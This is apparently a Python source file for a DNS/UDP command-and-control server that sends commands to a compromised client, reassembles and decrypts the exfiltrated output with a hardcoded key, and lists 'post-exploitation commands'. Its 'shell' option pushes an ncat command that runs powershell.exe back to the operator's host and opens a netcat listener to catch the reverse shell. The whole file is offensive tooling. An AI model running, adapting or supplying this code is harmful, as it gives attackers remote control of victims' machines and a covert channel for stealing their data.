from datetime import datetime
import os
import socket
from dataEncryptor import dataEncryptor
from payload import Payload


class DNSServer:
    def __init__(self,port,ip):
        self.port = port
        self.ip = ip
        self.clients = []
        self.count = 0
        self.request = None
    
    def start(self, c=None):
        commandRan = False
        commandFinished = True
        command = ""
        while command != "exit":
            if commandFinished:
                packets = bytearray()
                if self.count == 0 and c == None:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.bind((self.ip,self.port))
                    print("UDP Server Listening...\n")
                    req, address = sock.recvfrom(512)
                    self.request = req
                    self.count += 1
                    print("Got a client at " + address[0])
                    self.clients.append(address[0])
                    c = address[0]
                    print('Type "exit" as a command to quit')
                    print("Connected to " + address[0] + ":")
                    post()
                choice = input("\n" + "(" + c + ") > ")
                if choice == "exit":
                    sock.close()
                    self.count = 0
                    break
                elif choice == "help":
                    post()
                elif choice == "command":
                    command = input("Enter a command:")
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.bind((self.ip,self.port))
                    p = Payload(c)
                    p.payload(sock,self.request,command)
                    commandRan = True
                    newDataList = list()
                elif choice == "shell":
                    '''listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    listener.bind((self.ip,56345))
                    listener.listen(1)'''
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.bind((self.ip,self.port))
                    p = Payload(c)
                    p.payload(sock,self.request,("ncat --udp " + self.ip + " 4242 -e powershell.exe"))
                    os.system("nc -luvp 4242")
                    '''client_socket, client_address = listener.accept()
                    command = ""
                    while True:
                        command = input()
                        client_socket.send(command.encode())
                        if command == "exit":
                            client_socket.close()
                            listener.close()
                            break
                        ans = client_socket.recv((1024*128)).decode()
                        print(ans)'''

            if commandRan:
                req, address = sock.recvfrom(512) #start listening
                printWithTime("UDP", f"Received {len(req)} bytes from {address}")
                dataList = list(req)
                newDataList = list()
                found = False
                count = 0
                for i in dataList:
                    if i == 33:
                        found = True
                        count += 1
                        if count == 2:
                            break
                    elif found:
                        newDataList.append(i)
                bytesNewDataList = bytearray(newDataList)
                if bytesNewDataList.decode('utf-8') != 'end':
                    packets.extend(bytesNewDataList)
                    commandFinished = False
                else:
                    packets = bytes(packets)
                    packets = packets.decode('utf-8')
                    d = dataEncryptor()
                    output = d.decrypting(packets,"hellothisismebob")
                    output = output.decode('utf-8')
                    print("\nOutput of " + command + ":\n" + output)       
                    commandRan = False
                    commandFinished = True

    def showClients(self):
        print("\nAvailible Clients:")
        print("-------------------------------------------------------")
        for i in range(len(self.clients)):
            print(str(i + 1) + ". " + self.clients[i])
        print("\n")
    
    def select(self):
        self.showClients()
        client = input("Which Client would you like to connect to?")
        return self.clients[int(client)-1]
    
def post():
    print("\nList of built-in post-exploitation commands:")
    print("-------------------------------------------------------")
    print("command\t\t\tEnter commands manually")
    print("shell\t\t\tStarts a reverse shell on the system")
    print("exit\t\t\tReturn to main menu")
    print("help\t\t\tDisplay list of built-in post-exploitation commands\n")

def printWithTime(head, message):
        curr_time = datetime.now().strftime("%H:%M:%S.%f")
        print(f"[{head}] [{curr_time[:-3]}]", message)